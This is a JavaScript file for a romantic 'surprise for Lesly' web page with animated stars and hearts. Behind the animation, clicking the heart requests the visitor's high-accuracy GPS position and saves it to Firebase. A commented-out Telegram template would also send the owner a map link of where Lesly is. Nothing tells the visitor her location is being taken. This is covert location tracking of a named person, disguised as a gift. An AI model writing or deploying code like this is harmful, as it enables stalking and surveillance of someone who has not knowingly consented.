// ============================================
// SORPRESA PARA LESLY - JavaScript
// ============================================

// Crear estrellas de fondo
function createStars() {
    const starsContainer = document.getElementById('stars');
    for (let i = 0; i < 100; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.left = Math.random() * 100 + '%';
        star.style.top = Math.random() * 100 + '%';
        star.style.animationDelay = Math.random() * 3 + 's';
        starsContainer.appendChild(star);
    }
}

// Crear partículas de corazón flotantes
function createParticles() {
    const particlesContainer = document.getElementById('particles');
    const heartSymbols = ['❤', '💖', '💕'];
    
    setInterval(() => {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.innerHTML = heartSymbols[Math.floor(Math.random() * heartSymbols.length)];
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDuration = (Math.random() * 3 + 2) + 's';
        particlesContainer.appendChild(particle);
        
        setTimeout(() => particle.remove(), 4000);
    }, 300);
}

// Función principal del clic en el corazón
async function handleClick() {
    const heartBtn = document.getElementById('heartBtn');
    const loading = document.getElementById('loading');
    const mainContainer = document.getElementById('mainContainer');
    const bigHeart = document.getElementById('bigHeart');
    const loveMessage = document.getElementById('loveMessage');

    // Ocultar corazón clickeable y mostrar loading
    heartBtn.style.display = 'none';
    loading.classList.add('active');

    // Obtener ubicación GPS
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                console.log("✅ Ubicación obtenida:", lat, lng);
                console.log("📍 Precisión:", accuracy, "metros");

                // Guardar en Firebase
                let saved = false;
                if (window.saveToFirebase) {
                    saved = await window.saveToFirebase(lat, lng, accuracy);
                    if (saved) {
                        console.log("✅ Datos guardados en Firebase");
                    } else {
                        console.log("⚠️ No se pudo guardar en Firebase");
                    }
                }

                // Ocultar loading y mostrar sorpresa
                loading.classList.remove('active');
                mainContainer.style.display = 'none';
                bigHeart.classList.add('active');
                loveMessage.classList.add('active');

                // Crear explosión de partículas
                createExplosion();

                // Intentar enviar notificación (opcional)
                sendNotification(lat, lng);
            },
            (error) => {
                console.error("❌ Error de geolocalización:", error);
                // Aún así mostrar la sorpresa
                loading.classList.remove('active');
                mainContainer.style.display = 'none';
                bigHeart.classList.add('active');
                loveMessage.classList.add('active');
                createExplosion();
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    } else {
        // Si no hay geolocalización, igual mostrar sorpresa
        console.log("⚠️ Geolocalización no disponible");
        loading.classList.remove('active');
        mainContainer.style.display = 'none';
        bigHeart.classList.add('active');
        loveMessage.classList.add('active');
        createExplosion();
    }
}

// Explosión de partículas al hacer clic
function createExplosion() {
    const particlesContainer = document.getElementById('particles');
    const colors = ['#ff006e', '#ff4d6d', '#ff758f', '#ffb3c6', '#fff'];
    
    for (let i = 0; i < 50; i++) {
        setTimeout(() => {
            const particle = document.createElement('div');
            particle.style.position = 'absolute';
            particle.style.left = '50%';
            particle.style.top = '50%';
            particle.style.width = '10px';
            particle.style.height = '10px';
            particle.style.background = colors[Math.floor(Math.random() * colors.length)];
            particle.style.borderRadius = '50%';
            particle.style.pointerEvents = 'none';
            
            const angle = (Math.PI * 2 * i) / 50;
            const velocity = 100 + Math.random() * 200;
            const tx = Math.cos(angle) * velocity;
            const ty = Math.sin(angle) * velocity;
            
            particle.style.animation = `explode 1s ease-out forwards`;
            particle.style.setProperty('--tx', tx + 'px');
            particle.style.setProperty('--ty', ty + 'px');
            
            particlesContainer.appendChild(particle);
            setTimeout(() => particle.remove(), 1000);
        }, i * 20);
    }
}

// Función para enviar notificación adicional
function sendNotification(lat, lng) {
    // Aquí puedes agregar integración con:
    // - Telegram Bot API
    // - Pushover
    // - Email
    // - WhatsApp Business API
    // - O cualquier servicio de tu preferencia
    
    // Ejemplo con Telegram (descomenta y configura):
    /*
    const botToken = 'TU_BOT_TOKEN';
    const chatId = 'TU_CHAT_ID';
    const message = `💕 Lesly hizo clic en el corazón!\n📍 Ubicación: https://maps.google.com/?q=${lat},${lng}`;
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            chat_id: chatId, 
            text: message,
            parse_mode: 'HTML'
        })
    }).then(response => {
        console.log("✅ Notificación enviada");
    }).catch(error => {
        console.error("❌ Error al enviar notificación:", error);
    });
    */
}

// Inicializar cuando carga la página
document.addEventListener('DOMContentLoaded', function() {
    createStars();
    createParticles();
    console.log("💖 Sorpresa para Lesly cargada correctamente");
});